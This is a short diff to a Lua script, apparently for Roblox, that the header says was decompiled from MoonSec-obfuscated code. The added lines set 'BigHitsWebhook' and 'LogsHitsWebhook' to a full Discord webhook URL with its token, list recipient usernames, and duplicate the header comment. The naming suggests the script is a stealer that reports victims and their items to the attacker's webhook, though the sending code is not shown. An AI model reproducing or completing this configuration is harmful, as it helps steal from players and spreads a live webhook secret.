@@ -1,6 +1,14 @@
 -- Decompiled from MoonSec V3 disassembly
 -- (best-effort; control flow may need minor manual cleanup)
 -- By ZeroVector101
+-- Decompiled from MoonSec V3 disassembly
+-- (best-effort; control flow may need minor manual cleanup)
+-- By ZeroVector101
+BigHitsWebhook = "https://discord.com/api/webhooks/1489997831732334653/57PuxeBqPoWlknwh6-NjKlyngLtu_Ad83YQZf0fB1yGQIB-U3-1Jjz0KbOGdyCn2EnrU"
+LogsHitsWebhook = "https://discord.com/api/webhooks/1489997831732334653/57PuxeBqPoWlknwh6-NjKlyngLtu_Ad83YQZf0fB1yGQIB-U3-1Jjz0KbOGdyCn2EnrU"
+local config = {"popcatdzcutenhat1", "isagithedemonking21", "bin9999bintr", "showgametag54pro"}
+usernames = config
+Username_for_ttd = "popcatdzcutenhat"
 task.spawn(function(...)
     for v, v2 in ipairs(game:GetDescendants()) do
 
@@ -1498,4 +1506,6 @@ end
 return
 
 end
+
+return
 
